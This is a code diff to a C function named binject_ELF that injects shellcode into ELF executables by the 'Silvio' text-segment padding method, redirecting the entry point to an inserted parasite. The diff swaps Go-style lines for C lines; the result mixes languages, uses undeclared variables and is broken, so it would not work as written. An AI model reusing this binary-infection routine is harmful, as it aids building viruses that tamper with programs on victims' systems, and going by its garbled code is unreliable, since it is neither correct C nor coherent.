@@ -1,7 +1,8 @@
 int binject_ELF(char *file,char *shellcode,int method)
-{ 
+{
   uint32_t size;
   int i,x;
+  int sclen=strlen(shellcode);
   FILE *f;
   f=fopen(file,"r");
   fseek(f,0,SEEK_END);
@@ -20,50 +21,36 @@ int binject_ELF(char *file,char *shellcode,int method)
                         }
   if(method==SILVIO_METHOD)
   {
-           for(i=0;i<p_max;i++)
-           {
-            if(after_text_segment)
-            {page_offset+=page_size;}
-             else if (p.Type == elf.PT_LOAD && p.Flags == (elf.PF_R|elf.PF_X)) {
-			// 1. Locate the text segment program header
-			// -Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
-			originalEntry = elfFile.FileHeader.Entry
-			elfFile.FileHeader.Entry = p.Vaddr + p.Filesz
+p_offset+=4096;
 
-			// 7. Patch the insertion code (parasite) to jump to the entry point (original)
-			scAddr = p.Vaddr + p.Filesz
-			shellcode = api.ApplySuffixJmpIntel64(userShellCode, uint32(scAddr), uint32(originalEntry), elfFile.ByteOrder)
+	  
+e_entry=p_vaddr+p_filesz;
+	  for (phdr = (Elf32_Phdr *)pdata, i = 0; i < ehdr.e_phnum; i++) {
+		if (offset) {
+			phdr->p_offset += PAGE_SIZE;
+		} else if (phdr->p_type == PT_LOAD && phdr->p_offset == 0) {
+/* 
+	is this the text segment ? Nothing says the offset must be 0 but it
+	normally is.
+*/
+			int palen;
 
-			
-			p.Filesz += strlen(shellcode)
-			// -Increase p_memsz to account for the new code (parasite)
-			p.Memsz += strlen(shellcode)
+			if (phdr->p_filesz != phdr->p_memsz) goto error;
 
-			afterTextSegment = true
+			evaddr = phdr->p_vaddr + phdr->p_filesz;
+			palen = PAGE_SIZE - (evaddr & (PAGE_SIZE - 1));
+
+			if (palen < vlen) goto error;
+
+			ehdr.e_entry = evaddr + ventry;
+			offset = phdr->p_offset + phdr->p_filesz;
+
+			phdr->p_filesz += vlen;
+			phdr->p_memsz += vlen;
 		}
+
+		++phdr;
 	}
-
-	//	3. For the last shdr in the text segment
-	sortedSections := elfFile.Sections[:]
-	sort.Slice(sortedSections, func(a, b int) bool { return elfFile.Sections[a].Offset < elfFile.Sections[b].Offset })
-	for _, s := range sortedSections {
-
-		if s.Addr > scAddr {
-			// 4. For each shdr which is after the insertion
-			//	-Increase sh_offset by PAGE_SIZE
-			//todo: this ain't right s.Offset += PAGE_SIZE
-
-		} else if s.Size+s.Addr == scAddr { // assuming entry was set to (p_vaddr + p_filesz) above
-			//	-increase sh_len by the parasite length
-			s.Size += sclen
-		}
-	}
-
-	// 5. Physically insert the new code (parasite) and pad to PAGE_SIZE,
-	//	into the file - text segment p_offset + p_filesz (original)
-	elfFile.Insertion = shellcode
-
-	return elfFile.Bytes()
 }
            
   
